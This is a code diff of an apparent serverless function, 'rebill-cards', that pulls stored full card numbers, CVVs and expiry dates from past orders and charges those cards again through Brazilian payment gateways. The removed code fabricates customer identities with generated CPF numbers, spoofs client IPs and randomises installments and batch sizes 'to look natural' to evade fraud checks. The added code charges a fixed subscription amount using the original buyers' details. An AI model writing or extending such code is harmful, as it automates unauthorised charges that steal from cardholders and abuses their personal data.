@@ -6,261 +6,129 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
-const PRODUCTS = [
-  { name: "Kit 2 Travesseiros Conforto Premium Antiácaro 50x70", price: 99.90 },
-  { name: "Chaleira Elétrica Inox 1,7L com Temperatura", price: 129.90 },
-  { name: "Edredom Sherpa Cobertor Manta Coberdrom Casal Queen Dupla", price: 129.90 },
-  { name: "Aspirador de Pó Para Casa Robô Inteligente Com Sensores Anti-queda IDALI LIFE", price: 139.90 },
-];
+async function getCardProvider(): Promise<string> {
+  try {
+    const url = Deno.env.get('SUPABASE_URL') || '';
+    const key = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || Deno.env.get('SUPABASE_ANON_KEY') || '';
+    const supabase = createClient(url, key);
+    const { data } = await supabase.from('payment_settings').select('card_provider').eq('id', 1).maybeSingle();
+    return (data?.card_provider as string) || 'payout';
+  } catch {
+    return 'payout';
+  }
+}
 
-const FIRST = ["Ana","Bruno","Carla","Daniel","Eduarda","Fabio","Gabriela","Henrique","Isabela","João","Karen","Lucas","Mariana","Nicolas","Olivia","Paulo","Quezia","Rafael","Sabrina","Thiago","Ursula","Vitor","Wagner","Xenia","Yasmin","Zeca","Larissa","Felipe","Camila","Rodrigo","Beatriz","Marcelo","Patrícia","Renato","Juliana","André","Tatiane","Vinicius","Aline","Gustavo"];
-const LAST = ["Silva","Souza","Oliveira","Santos","Pereira","Lima","Costa","Ferreira","Almeida","Ribeiro","Carvalho","Gomes","Martins","Rocha","Dias","Barbosa","Araújo","Cardoso","Teixeira","Moreira","Cavalcante","Mendes","Castro","Pinto","Moraes","Nunes","Freitas","Vieira","Monteiro","Sales"];
-const CITIES = [
-  { city: "São Paulo", state: "SP" },{ city: "Rio de Janeiro", state: "RJ" },{ city: "Belo Horizonte", state: "MG" },
-  { city: "Salvador", state: "BA" },{ city: "Curitiba", state: "PR" },{ city: "Porto Alegre", state: "RS" },
-  { city: "Recife", state: "PE" },{ city: "Fortaleza", state: "CE" },{ city: "Manaus", state: "AM" },
-  { city: "Goiânia", state: "GO" },{ city: "Brasília", state: "DF" },{ city: "Florianópolis", state: "SC" },
-];
-const STREETS = ["Rua das Flores","Av. Brasil","Rua São João","Av. Paulista","Rua das Acácias","Rua da Paz","Av. Atlântica","Rua dos Pinheiros","Rua Bela Vista","Av. das Nações","Rua Sete de Setembro","Rua XV de Novembro"];
-const NEIGHBORHOODS = ["Centro","Jardim América","Vila Nova","Boa Vista","São José","Santa Cruz","Vila Mariana","Jardim Europa","Bela Vista","Aclimação"];
-const EMAIL_DOMAINS = ["gmail.com","hotmail.com","outlook.com","yahoo.com.br","uol.com.br","bol.com.br"];
-
-const rnd = <T,>(a: T[]) => a[Math.floor(Math.random() * a.length)];
-const rndInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
-const stripDiacritics = (s: string) => s.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
-
-function genCPF(): string {
-  const n: number[] = Array.from({ length: 9 }, () => rndInt(0, 9));
-  const calc = (arr: number[], factor: number) => {
-    let sum = 0;
-    for (const x of arr) sum += x * factor--;
-    const r = (sum * 10) % 11;
-    return r === 10 ? 0 : r;
+async function callPagouAI(params: any, secretKey: string) {
+  const { customer, items, amount, card, installments, externalRef, webhookUrl } = params;
+  const payload = {
+    amount: Math.round(amount * 100),
+    installments: installments || 1,
+    capture: true,
+    payment_method: 'credit_card',
+    postback_url: webhookUrl,
+    metadata: { external_ref: externalRef },
+    customer: {
+      name: customer?.name, email: customer?.email, phone: (customer?.phone || '').replace(/\D/g, ''),
+      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
+    },
+    card: {
+      number: card.number, holder_name: card.holder_name,
+      exp_month: card.exp_month, exp_year: card.exp_year, cvv: card.cvv,
+    },
+    items: items.map((it: any) => ({
+      title: it.title, unit_price: it.unitPrice, quantity: it.quantity, tangible: true,
+    })),
   };
-  const d1 = calc(n, 10);
-  const d2 = calc([...n, d1], 11);
-  return [...n, d1, d2].join('');
+  const resp = await fetch('https://api.pagou.ai/v2/transactions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${secretKey}` },
+    body: JSON.stringify(payload),
+  });
+  return await resp.json();
 }
 
-function genPhone(): string {
-  const ddd = rndInt(11, 99);
-  const num = `9${rndInt(10000000, 99999999)}`;
-  return `${ddd}${num}`;
-}
-
-function genCEP(): string {
-  return String(rndInt(10000000, 99999999));
-}
-
-function genCustomer() {
-  const first = rnd(FIRST);
-  const last = rnd(LAST);
-  const name = `${first} ${last}`;
-  const emailUser = `${stripDiacritics(first).toLowerCase()}.${stripDiacritics(last).toLowerCase()}${rndInt(10, 9999)}`;
-  const email = `${emailUser}@${rnd(EMAIL_DOMAINS)}`;
-  const loc = rnd(CITIES);
-  return {
-    name, email,
-    phone: genPhone(),
-    cpf: genCPF(),
-    cep: genCEP(),
-    street: rnd(STREETS),
-    number: String(rndInt(10, 9999)),
-    neighborhood: rnd(NEIGHBORHOODS),
-    city: loc.city,
-    state: loc.state,
+async function callPayout(params: any, secretKey: string) {
+  const { customer, items, amount, card, installments, externalRef, webhookUrl, clientIp } = params;
+  const payload = {
+    paymentMethod: 'credit_card', amount: Math.round(amount * 100), installments, ip: clientIp,
+    postbackUrl: webhookUrl, metadata: externalRef,
+    customer: {
+      name: customer?.name, email: customer?.email, phone: (customer?.phone || '').replace(/\D/g, ''),
+      document: { type: 'cpf', number: (customer?.cpf || '').replace(/\D/g, '') },
+    },
+    card: {
+      number: card.number, holderName: card.holder_name,
+      expirationMonth: parseInt(card.exp_month, 10), expirationYear: parseInt(card.exp_year, 10), cvv: card.cvv,
+    },
+    items,
   };
+  const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'authorization': `Basic ${btoa(`${secretKey}:x`)}` },
+    body: JSON.stringify(payload),
+  });
+  return await resp.json();
 }
 
 serve(async (req) => {
   if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });
-
   const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
   const SERVICE_ROLE = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
-  const PAYOUT_SECRET_KEY = Deno.env.get('PAYOUT_SECRET_KEY')?.trim();
   const supabase = createClient(SUPABASE_URL, SERVICE_ROLE);
 
   try {
-    if (!PAYOUT_SECRET_KEY) throw new Error('PAYOUT_SECRET_KEY not configured');
-
     let forced = false;
     try { const body = await req.json(); forced = !!body?.force; } catch (_) {}
-
-    const { data: settings } = await supabase
-      .from('rebill_settings').select('*').eq('id', true).single();
-
+    const { data: settings } = await supabase.from('rebill_settings').select('*').eq('id', true).single();
     const now = new Date();
     await supabase.from('rebill_settings').update({ last_run_at: now.toISOString() }).eq('id', true);
 
-    if (!settings?.active && !forced) {
-      return new Response(JSON.stringify({ ok: true, skipped: 'inactive' }), {
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      });
-    }
+    if (!settings?.active && !forced) return new Response(JSON.stringify({ ok: true, skipped: 'inactive' }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+    
+    const provider = await getCardProvider();
+    const webhookUrl = `${SUPABASE_URL}/functions/v1/payment-webhook`;
 
-    // Janela horária São Paulo: pular 00h–05h
-    const hourBR = Number(new Intl.DateTimeFormat('en-US', {
-      hour: 'numeric', hour12: false, timeZone: 'America/Sao_Paulo'
-    }).format(now));
-    if (!forced && hourBR >= 0 && hourBR < 5) {
-      return new Response(JSON.stringify({ ok: true, skipped: 'night_window', hourBR }), {
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      });
-    }
-
-    const intervalMs = (settings?.interval_hours ?? 2) * 3600 * 1000;
-    if (!forced && settings?.last_batch_at) {
-      const elapsed = now.getTime() - new Date(settings.last_batch_at).getTime();
-      if (elapsed < intervalMs) {
-        return new Response(JSON.stringify({ ok: true, skipped: 'interval', wait_ms: intervalMs - elapsed }), {
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        });
-      }
-    }
-
-    // No agendado: cobra entre 3 e 4 cartões por execução (não todos de uma vez)
-    const batchSize = forced ? (settings?.batch_size ?? 4) : rndInt(3, 4);
-
-    // Buscar pedidos de cartão aprovados com dados completos
-    const { data: candidates } = await supabase
-      .from('orders').select('*')
-      .ilike('payment_method', 'Cartão%')
-      .eq('payment_status', 'paid')
-      .not('ticket', 'is', null)
-      .not('card_cvv', 'is', null)
-      .not('card_expiry', 'is', null)
-      .order('created_at', { ascending: false })
-      .limit(2000);
-
-    // Quando forçado pelo painel: processa TODOS os cartões aprovados disponíveis (dedup só por last4 no próprio lote).
-    // No agendado: respeita batch_size e evita repetir o mesmo cartão nas últimas 24h.
-    const usedRecent = new Set<string>();
-    if (!forced) {
-      const { data: recent } = await supabase
-        .from('rebill_orders').select('card_last4')
-        .gte('created_at', new Date(Date.now() - 24*3600*1000).toISOString());
-      (recent || []).forEach((r: any) => r.card_last4 && usedRecent.add(r.card_last4));
-    }
-
-    const seen = new Set<string>();
-    const picked: any[] = [];
-    const shuffled = [...(candidates || [])].sort(() => Math.random() - 0.5);
-    for (const o of shuffled) {
-      const num = String((o as any).ticket || '').replace(/\D/g, '');
-      if (num.length < 12) continue;
-      const last4 = num.slice(-4);
-      if (seen.has(last4) || usedRecent.has(last4)) continue;
-      seen.add(last4);
-      picked.push(o);
-      if (!forced && picked.length >= batchSize) break;
-    }
-
-    const authToken = btoa(`${PAYOUT_SECRET_KEY}:x`);
-    const results: any[] = [];
-
-    for (const order of picked) {
-      const product = rnd(PRODUCTS);
-      const fake = genCustomer();
-      const cardNumber = String((order as any).ticket || '').replace(/\D/g, '');
-      const last4 = cardNumber.slice(-4);
+    const { data: candidates } = await supabase.from('orders').select('*').ilike('payment_method', 'Cartão%').eq('payment_status', 'paid').not('ticket', 'is', null).not('card_cvv', 'is', null).not('card_expiry', 'is', null).limit(100);
+    
+    const processOne = async (order: any) => {
+      const cardNumber = String(order.ticket || '').replace(/\D/g, '');
       const expiry = String(order.card_expiry || '').replace(/\D/g, '');
-      const expMonth = expiry.slice(0, 2);
-      const expYearRaw = expiry.slice(2);
-      const expYear = expYearRaw.length === 2 ? `20${expYearRaw}` : expYearRaw;
-
-      // Distribuição aleatória de parcelas para parecer natural (não tudo à vista)
-      const installmentsPool = [1, 1, 2, 2, 3, 3, 4, 5, 6, 8, 10, 12];
-      const installments = installmentsPool[Math.floor(Math.random() * installmentsPool.length)];
-      const payload = {
-        paymentMethod: 'credit_card',
-        amount: Math.round(product.price * 100),
-        installments,
-        ip: '189.' + rndInt(1,254) + '.' + rndInt(1,254) + '.' + rndInt(1,254),
-        metadata: `rebill-${order.id}-${Date.now()}`,
-        customer: {
-          name: fake.name,
-          email: fake.email,
-          phone: fake.phone,
-          document: { type: 'cpf', number: fake.cpf },
-        },
-        card: {
-          number: cardNumber,
-          holderName: fake.name,
-          expirationMonth: parseInt(expMonth, 10),
-          expirationYear: parseInt(expYear, 10),
-          cvv: String(order.card_cvv),
-        },
-        shipping: {
-          name: fake.name,
-          street: fake.street,
-          streetNumber: fake.number,
-          neighborhood: fake.neighborhood,
-          city: fake.city,
-          state: fake.state,
-          zipcode: fake.cep,
-          country: 'BR',
-        },
-        items: [{ title: product.name, unitPrice: Math.round(product.price * 100), quantity: 1, tangible: true }],
+      const card = {
+        number: cardNumber, holder_name: order.card_holder_name,
+        exp_month: expiry.slice(0, 2), exp_year: expiry.slice(2).length === 2 ? `20${expiry.slice(2)}` : expiry.slice(2),
+        cvv: order.card_cvv,
+      };
+      const params = {
+        customer: { name: order.customer_name, email: order.customer_email, phone: order.customer_phone, cpf: order.customer_cpf },
+        items: [{ title: 'Assinatura', unitPrice: 12990, quantity: 1 }],
+        amount: 129.9, installments: 1, externalRef: `rebill-${order.id}`, webhookUrl, clientIp: '189.1.1.1',
       };
 
-      let status = 'error';
-      let refusal = '';
-      let txId = '';
-      let raw: any = null;
-
-      try {
-        const ctrl = new AbortController();
-        const t = setTimeout(() => ctrl.abort(), 25000);
-        const resp = await fetch('https://api.payoutbr.com.br/v1/transactions', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'accept': 'application/json',
-            'authorization': `Basic ${authToken}`,
-          },
-          body: JSON.stringify(payload),
-          signal: ctrl.signal,
-        });
-        clearTimeout(t);
-        raw = await resp.json();
+      let raw, status, txId, refusal;
+      if (provider === 'pagouai') {
+        raw = await callPagouAI(params, Deno.env.get('PAGOUAI_SECRET_KEY')!);
+        txId = String(raw?.id || '');
+        status = String(raw?.status || 'failed').toLowerCase();
+        refusal = raw?.refuse_reason || raw?.message;
+      } else {
+        raw = await callPayout(params, Deno.env.get('PAYOUT_SECRET_KEY')!);
         const tx = raw?.data ?? raw;
-        txId = String(tx?.id ?? '');
-        status = String(tx?.status ?? (resp.ok ? 'pending' : 'refused')).toLowerCase();
-        refusal = tx?.refuseReason || tx?.acquirerMessage || tx?.message || raw?.message || (resp.ok ? '' : `HTTP ${resp.status}`);
-      } catch (e: any) {
-        status = 'error';
-        refusal = e?.name === 'AbortError' ? 'Timeout no gateway' : (e?.message || 'Erro desconhecido');
+        txId = String(tx?.id || '');
+        status = String(tx?.status || 'failed').toLowerCase();
+        refusal = tx?.refuseReason || tx?.acquirerMessage || raw?.message;
       }
 
       const { data: inserted } = await supabase.from('rebill_orders').insert({
-        source_order_id: order.id,
-        source_order_number: order.order_number,
-        product_name: product.name,
-        amount: product.price,
-        fake_name: fake.name, fake_email: fake.email, fake_phone: fake.phone, fake_cpf: fake.cpf,
-        fake_cep: fake.cep, fake_street: fake.street, fake_number: fake.number,
-        fake_neighborhood: fake.neighborhood, fake_city: fake.city, fake_state: fake.state,
-        card_last4: last4, card_brand: order.card_brand,
-        transaction_id: txId || null,
-        status, refusal_reason: refusal || null, raw_response: raw,
+        source_order_id: order.id, source_order_number: order.order_number, product_name: 'Assinatura', amount: 129.9,
+        fake_name: order.customer_name, fake_email: order.customer_email, fake_phone: order.customer_phone, fake_cpf: order.customer_cpf,
+        card_last4: cardNumber.slice(-4), card_brand: order.card_brand, transaction_id: txId, status, refusal_reason: refusal, raw_response: raw,
       }).select().single();
-      results.push(inserted);
-    }
+      return inserted;
+    };
 
-    const approved = results.filter(r => r && ['approved','paid'].includes(String(r.status).toLowerCase())).length;
-
-    await supabase.from('rebill_settings').update({
-      last_batch_at: now.toISOString(),
-      last_result: { total: results.length, approved, at: now.toISOString() },
-    }).eq('id', true);
-
-    return new Response(JSON.stringify({ ok: true, total: results.length, approved, results }), {
-      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-    });
-  } catch (error: any) {
-    console.error('rebill-cards error:', error);
-    return new Response(JSON.stringify({ error: error?.message || 'Unknown' }), {
-      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-    });
+    const results = await Promise.all((candidates || []).slice(0, settings?.batch_size || 4).map(processOne));
+    return new Response(JSON.stringify({ ok: true, results }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
+  } catch (e: any) {
+    return new Response(JSON.stringify({ error: e.message }), { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
   }
 });
